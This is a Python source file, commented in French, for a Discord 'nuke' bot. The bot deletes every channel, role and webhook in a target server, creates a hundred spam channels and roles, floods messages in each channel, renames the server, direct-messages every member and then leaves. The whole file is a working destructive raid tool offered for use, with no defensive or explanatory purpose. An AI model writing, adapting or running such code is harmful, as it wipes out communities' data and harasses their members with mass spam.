import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

    # Demande du token et de l'ID du serveur
    token = input("[ ? ] Token : ")
    server_id = int(input("[ ? ] ID server : "))

    # Demande des informations supplémentaires
    channel_name = input("Entrez le nom des salon à créer : ")
    role_name = input("Entrez le nom des rôles : ")
    new_server_name = input("Entrez le nouveau nom du serveur : ")
    message_content = input("Entrez le message à envoyer dans les salons : ")
    message_count = int(input("Combien de fois le message doit-il être envoyé dans chaque salon ? "))
    mp_message = input("Entrez le message à envoyer en MP à tous les membres : ")

    # Récupération du serveur
    guild = bot.get_guild(server_id)
    if guild is None:
        print(f"Impossible de trouver le serveur avec l'ID {server_id}")
        return

    # Suppression des salons
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"Channel {channel.name} supprimé")
        except Exception as e:
            print(f"Erreur en supprimant {channel.name}: {e}")

    # Suppression des rôles
    for role in guild.roles:
        try:
            await role.delete()
            print(f"Role {role.name} supprimé")
        except Exception as e:
            print(f"Erreur en supprimant {role.name}: {e}")

    # Suppression des webhooks
    for webhook in await guild.webhooks():
        try:
            await webhook.delete()
            print(f"Webhook {webhook.name} supprimé")
        except Exception as e:
            print(f"Erreur en supprimant {webhook.name}: {e}")

    # Création des salons
    for _ in range(100):
        try:
            await guild.create_text_channel(channel_name)
            print(f"Channel {channel_name} créé")
        except Exception as e:
            print(f"Erreur en créant un channel: {e}")

    # Envoi du message dans tous les salons, répété 'message_count' fois
    for i in range(message_count):
        print(f"Envoi de la série {i+1}/{message_count} de messages dans les salons")
        for channel in guild.text_channels:
            try:
                await channel.send(message_content)
                print(f"Message envoyé dans {channel.name}")
            except Exception as e:
                print(f"Erreur en envoyant des messages dans {channel.name}: {e}")
        # Attente de 1 seconde avant de répéter l'envoi
        await asyncio.sleep(1)

    # Création des rôles
    for _ in range(100):
        try:
            await guild.create_role(name=role_name)
            print(f"Role {role_name} créé")
        except Exception as e:
            print(f"Erreur en créant un rôle: {e}")

    # Renommer le serveur
    try:
        await guild.edit(name=new_server_name)
        print("Serveur renommé")
    except Exception as e:
        print(f"Erreur en renommant le serveur: {e}")

    # Envoyer des messages privés à tous les membres
    for member in guild.members:
        try:
            await member.send(mp_message)
            print(f"Message envoyé à {member.name}")
        except Exception as e:
            print(f"Erreur en envoyant un message à {member.name}: {e}")

    # Quitter le serveur
    try:
        await guild.leave()
        print("Bot a quitté le serveur")
    except Exception as e:
        print(f"Erreur en quittant le serveur: {e}")

    # Arrêter le bot après toutes les actions
    await bot.close()

# Demander le token de bot à l'utilisateur et lancer le bot
token = input("[ ? ] Token : ")
bot.run(token)
